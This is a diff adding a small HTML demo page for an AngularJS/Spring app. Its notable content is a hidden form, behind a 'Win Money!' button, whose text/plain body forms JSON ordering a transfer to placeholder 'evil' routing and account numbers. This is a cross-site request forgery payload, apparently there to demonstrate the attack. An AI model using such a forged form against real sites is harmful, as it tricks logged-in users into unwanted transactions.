@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<title>Demo</title>
+	<meta name="description" content="" />
+	<meta name="viewport" content="width=device-width" />
+	<base href="/" />
+	<link rel="stylesheet" type="text/css" href="/webjars/bootstrap/css/bootstrap.min.css" />
+	<link rel="stylesheet" type="text/css" href="/webjars/fullcalendar/fullcalendar.css" />
+
+</head>
+
+<body ng-app="hello">
+	<form action="/rest/bookedTime" method="post" enctype="text/plain">
+		<input
+			name='{"amount":100,"routingNumber":"evilsRoutingNumber","account":"evilsAccountNumber", "ignore_me":"'
+			value='test"}' type='hidden'> <input type="submit"
+			value="Win Money!" />
+	</form>
+
+
+	<div class="container">
+		<h1>Greeting</h1>
+		<div ng-controller="home" ng-cloak class="ng-cloak">
+			<p>The ID is {{greeting.id}}</p>
+			<p>The content is {{greeting.content}}</p>
+		</div>
+	</div>
+	
+	<script type="text/javascript" src="/webjars/jquery/jquery.min.js"></script>
+    <script type="text/javascript" src="/webjars/bootstrap/js/bootstrap.min.js"></script>
+	<script src="/webjars/angularjs/angular.js" type="text/javascript"></script>
+	<script src="/webjars/angular-ui-bootstrap/1.2.5/ui-bootstrap.js"></script>
+	<script src="/js/hello.js"></script>
+	<script src="/js/main.js"></script>
+	
+</html>
